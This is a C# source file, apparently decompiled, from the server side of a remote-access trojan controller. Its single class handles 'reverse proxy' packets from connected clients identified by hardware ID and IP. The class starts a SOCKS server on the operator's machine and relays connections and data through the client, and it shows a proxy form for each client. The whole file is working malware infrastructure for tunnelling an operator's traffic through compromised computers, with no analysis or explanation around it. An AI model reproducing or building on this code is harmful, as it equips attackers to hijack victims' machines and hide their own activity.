#define TRACE
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Newtonsoft.Json;
using Server.Connection;
using Server.Forms;
using Server.ReverseProxy;

namespace Server.Handle_Packet;

public class HandleReverseProxy
{
	private readonly ReverseProxyServer _socksServer = new ReverseProxyServer();

	public Clients CommunicationClient;

	public FormReverseProxy ProxyForm
	{
		get
		{
			if (CommunicationClient == null)
			{
				return null;
			}
			string name = "Reverse Proxy : " + CommunicationClient.info.hwid;
			FormReverseProxy formReverseProxy = (FormReverseProxy)Application.OpenForms[name];
			if (formReverseProxy == null)
			{
				FormReverseProxy formReverseProxy2 = new FormReverseProxy();
				formReverseProxy2.Name = name;
				formReverseProxy2.Text = "Reverse Proxy for " + CommunicationClient.Ip + " (" + CommunicationClient.info.hwid + ")";
				formReverseProxy = formReverseProxy2;
			}
			return formReverseProxy;
		}
	}

	public void StartReverseProxyServer(ushort port)
	{
		_socksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
		_socksServer.OnUpdateConnection += socksServer_onUpdateConnection;
		_socksServer.StartServer(CommunicationClient, port);
	}

	public void StopReverseProxyServer()
	{
		_socksServer.Stop();
		_socksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
		_socksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
	}

	private void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
	{
		if (ProxyForm == null)
		{
			return;
		}
		new Thread((ThreadStart)delegate
		{
			Program.mainform.Invoke((MethodInvoker)delegate
			{
				ProxyForm.OnReport(_socksServer.OpenConnections);
			});
		}).Start();
	}

	private void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
	{
		if (ProxyForm == null)
		{
			return;
		}
		new Thread((ThreadStart)delegate
		{
			Program.mainform.Invoke((MethodInvoker)delegate
			{
				ProxyForm.OnReport(_socksServer.OpenConnections);
			});
		}).Start();
	}

	public void Dispose()
	{
		Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool disposing)
	{
		if (disposing)
		{
			StopReverseProxyServer();
		}
	}

	public void ExitProxy()
	{
		try
		{
			CommunicationClient.Disconnected();
			CommunicationClient = null;
			StopReverseProxyServer();
		}
		catch
		{
		}
	}

	public void ConnectionEstablised(Clients client)
	{
		_ = "Reverse Proxy : " + client.info.hwid;
		CommunicationClient = client;
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			if (ProxyForm != null)
			{
				ProxyForm.ShowDialog();
			}
		});
	}

	public void ConnectionResponse(ReverseProxyConnectResponse msg)
	{
		_socksServer.GetClientByConnectionId(msg.ConnectionId)?.HandleCommandResponse(msg);
		if (msg.IsConnected)
		{
			Trace.WriteLine($"Server: Connected to {msg.HostName}:{msg.RemotePort}");
		}
	}

	public void DataArrived(ReverseProxyData msg)
	{
		_socksServer.GetClientByConnectionId(msg.ConnectionId)?.SendToClient(msg.Data);
	}

	public void Disconnected(ReverseProxyDisconnect msg)
	{
		_socksServer.GetClientByConnectionId(msg.ConnectionId)?.Disconnect();
	}

	public void Execute(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			_ = unpack_msgpack.ForcePathObject("Hwid").AsString;
			ReverseProxyCommands reverseProxyCommands = (ReverseProxyCommands)unpack_msgpack.ForcePathObject("type").AsInteger;
			string asString = unpack_msgpack.ForcePathObject("json").AsString;
			switch (reverseProxyCommands)
			{
			case ReverseProxyCommands.INIT:
				ConnectionEstablised(client);
				break;
			case ReverseProxyCommands.CONNECTRESPONSE:
			{
				ReverseProxyConnectResponse msg3 = JsonConvert.DeserializeObject<ReverseProxyConnectResponse>(asString);
				ConnectionResponse(msg3);
				break;
			}
			case ReverseProxyCommands.DATA:
			{
				ReverseProxyData msg2 = JsonConvert.DeserializeObject<ReverseProxyData>(asString);
				DataArrived(msg2);
				break;
			}
			case ReverseProxyCommands.DISCONNECT:
			{
				ReverseProxyDisconnect msg = JsonConvert.DeserializeObject<ReverseProxyDisconnect>(asString);
				Disconnected(msg);
				break;
			}
			}
		}
		catch
		{
		}
	}

	public void CloseConnection(int index)
	{
		_socksServer.KillConnection(index);
	}
}
